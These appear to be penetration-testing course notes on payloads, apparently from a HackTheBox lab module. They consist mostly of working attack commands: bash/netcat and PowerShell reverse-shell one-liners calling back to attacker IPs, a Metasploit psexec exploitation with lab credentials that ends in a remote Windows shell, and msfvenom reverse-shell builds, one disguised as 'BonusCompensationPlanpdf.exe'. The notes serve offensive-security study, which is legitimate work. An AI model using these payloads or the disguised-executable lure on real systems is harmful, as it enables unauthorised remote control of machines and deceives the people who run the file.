
## 1.Introduction to Payloads

### One-Liners Examined

**Netcat/Bash Reverse Shell One-liner**

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

### PowerShell One-liner Explained

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

{% embed url="<https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1>" %}

### 2.Automating Payloads & Delivery with Metasploit

**Starting MSF**

```shell-session
sudo msfconsole 
```

**NMAP Scan**

```shell-session
nmap -sC -sV -Pn 10.129.164.25
```

**Searching Within Metasploit**

```shell-session
msf6 > search smb
```

* let's choose 56 exploit/windows/smb/psexec

```shell-session
msf6 > use 56
```

**Examining an Exploit's Options**

```shell-session
msf6 exploit(windows/smb/psexec) > options
```

**Setting Options**

```shell-session
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

**Exploits Away**

```shell-session
msf6 exploit(windows/smb/psexec) > exploit
```

**Interactive Shell**

```shell-session
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

***

## 3.Crafting Payloads with MSFvenom

**List Payloads**

```shell-session
 msfvenom -l payloads
```

## Building A Stageless Payload

```shell-session
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

### Executing a Stageless Payload

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fr7OSXJaMVHVkJawmNQAQ%2Fimage.png?alt=media&amp;token=06ea4b96-4523-4f77-898a-a64d2c169b31" alt=""><figcaption></figcaption></figure>

**NC Connection**

```shell-session
 sudo nc -lvnp 443
```

## Building Stageless Payload for a Windows system

**Windows Payload**

```shell-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

### Executing a Simple Stageless Payload On a Windows System

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FlauJ5aJWRs4qu6qjYzfi%2Fimage.png?alt=media&amp;token=d762f569-d19d-4bb7-82e8-418c565a826e" alt=""><figcaption></figcaption></figure>

```shell-session
sudo nc -lvnp 443
```
